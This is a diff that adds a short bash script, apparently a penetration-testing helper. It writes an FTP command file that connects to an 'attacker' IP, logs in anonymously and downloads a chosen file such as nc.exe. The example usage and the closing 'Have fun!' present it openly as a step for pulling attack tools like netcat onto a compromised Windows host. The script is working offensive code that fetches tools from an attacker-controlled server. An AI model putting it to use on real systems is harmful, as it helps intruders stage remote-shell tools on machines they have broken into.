@@ -1,0 +1,24 @@
+#!/bin/bash
+#Usage: $0 <attacker-ip> <file-to-transfer> <output-text>
+usage="--------------------------------------------------------------
+Usage: $0 <attacker-ip> <file> <output-text>
+Example: $0 10.10.10.253 nc.exe /ftp/ftpGet.txt
+---------------------------------------------------------------------"
+
+if [ ! $# == 3 ]; then
+	echo "$usage";
+	exit 0;
+fi
+
+attacker=$1;
+xferFile=$2;
+outFile=$3;
+
+echo open $1 21 > $3;
+echo USER anonymous >> $3;
+echo anonymous@boned.com >> $3;
+echo bin >> $3;
+echo GET $2 >> $3;
+echo bye >> $3;
+
+echo File: $3 created successfully. Have fun!
